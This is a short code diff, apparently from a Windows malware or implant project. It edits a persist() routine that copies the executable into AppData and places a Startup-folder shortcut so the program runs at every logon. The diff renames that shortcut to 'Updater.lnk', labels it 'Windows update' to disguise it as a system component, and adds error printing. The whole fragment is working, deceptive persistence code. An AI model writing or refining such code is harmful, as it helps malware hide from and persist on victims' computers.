@@ -157,7 +157,7 @@ INT persist() {
     WCHAR startup_file[MAX_PATH] = L"\0";
     StringCbCatW(startup_file, sizeof(startup_file), startup_path);
     StringCbCatW(startup_file, sizeof(startup_file), L"\\");
-    StringCbCatW(startup_file, sizeof(startup_file), L"win_update.lnk");
+    StringCbCatW(startup_file, sizeof(startup_file), L"Updater.lnk");
 
     if (!PathFileExistsW(appdata_file)) {
         Debug(printf("Source path: %ls\nDestination path: %ls\n", file_path, appdata_file);)
@@ -169,7 +169,7 @@ INT persist() {
 
     Debug(printf("Source path: %ls\nLink path: %ls\n", appdata_file, startup_file);)
 
-    if (CreateLink(appdata_file, startup_file, L"Windows update service") != S_OK) {
+    if (CreateLink(appdata_file, startup_file, L"Windows update") != S_OK) {
         Debug(printf("Creating link failed\n");)
         return -1;
     }
@@ -207,6 +207,8 @@ HRESULT CreateLink(LPCWSTR lpszPathObj, LPCWSTR lpszPathLink, LPCWSTR lpszDesc)
 
         psl->Release();
     }
+    _com_error err(hres);
+    printf("Error: %ls\n", err.ErrorMessage());
     return hres;
 }
 
